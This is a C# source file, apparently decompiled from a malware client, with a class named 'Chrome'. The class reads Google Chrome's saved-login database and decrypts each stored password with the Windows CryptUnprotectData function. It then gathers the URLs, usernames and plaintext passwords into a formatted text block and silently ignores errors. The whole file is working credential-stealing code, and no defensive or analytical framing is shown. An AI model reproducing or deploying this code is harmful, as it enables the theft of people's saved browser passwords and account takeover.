using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Client;

[StandardModule]
internal sealed class Chrome
{
	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	public static string cPass;

	public static object c = "============Chrome==============\r\n";

	public static void GetChrome()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = sQLiteHandler.GetRowCount() - 1;
				for (int i = 0; i <= num; i++)
				{
					string value = sQLiteHandler.GetValue(i, "origin_url");
					string value2 = sQLiteHandler.GetValue(i, "username_value");
					string text2 = Decrypt(Encoding.Default.GetBytes(sQLiteHandler.GetValue(i, "password_value")));
					if ((Operators.CompareString(value2, "", false) != 0) & (Operators.CompareString(text2, "", false) != 0))
					{
						cPass = "\r\nURL: " + value + "\r\nUsername: " + value2 + "\r\nPassword: " + text2 + "\r\n ";
						c = Operators.AddObject(c, (object)cPass);
					}
				}
				c = Operators.AddObject(c, (object)"\r\n================================\r\n\r\n");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	public static string Decrypt(byte[] Datas)
	{
		DATA_BLOB pDataIn = default(DATA_BLOB);
		DATA_BLOB pDataOut = default(DATA_BLOB);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		DATA_BLOB dATA_BLOB = default(DATA_BLOB);
		DATA_BLOB pOptionalEntropy = dATA_BLOB;
		CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
		CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = cRYPTPROTECT_PROMPTSTRUCT;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
